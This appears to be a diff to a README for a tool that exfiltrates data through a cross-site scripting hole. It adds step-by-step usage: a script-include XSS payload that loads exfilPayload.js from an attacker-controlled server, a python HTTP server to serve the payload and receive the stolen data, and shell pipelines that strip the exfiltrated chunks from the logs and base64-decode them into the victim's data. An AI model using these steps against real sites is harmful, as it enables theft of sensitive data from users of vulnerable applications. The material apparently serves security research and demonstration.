@@ -3,3 +3,24 @@ Sample code for exfiltrating data through an XSS vulnerability. XSS Payload retr
 
 Will link to blog post once it's posted. 
 
+Basically you tailor the exfilPayload.js file to grab the sensitive data your victim has access to. 
+
+Then in you pull that JavaScript file into the browswer by doing a script include in the XSS vulnerability:
+<script src="http://127.0.0.1/exfilPayload.js"></script>
+
+Start up a python HTTP server in the directory whwere exfilPayload.js is:
+python -m SimpleHTTPServer 80
+
+The exfilePayload.js will send to that same server the chunks of the data being exfiltrated. 
+
+Copy those requests into a text file, clean it up with:
+grep '/exfil/' exfilledData.txt | awk -F'/exfil/' '{print $2}' | awk -F'/' '{print $1 " " $2}' | awk -F'.jpg' '{print $1}' | while read i; do echo $i ; done > exfilledDataCleaned.txt
+
+Then use the python script in this repo.
+
+Then you can put the chunks back together finally with:
+for file in ./{0..225}.chunk; do cat $file | base64 -d; done > restoredSuperSecretData.html
+
+The blog post should make it clearer. 
+
+@hoodoer
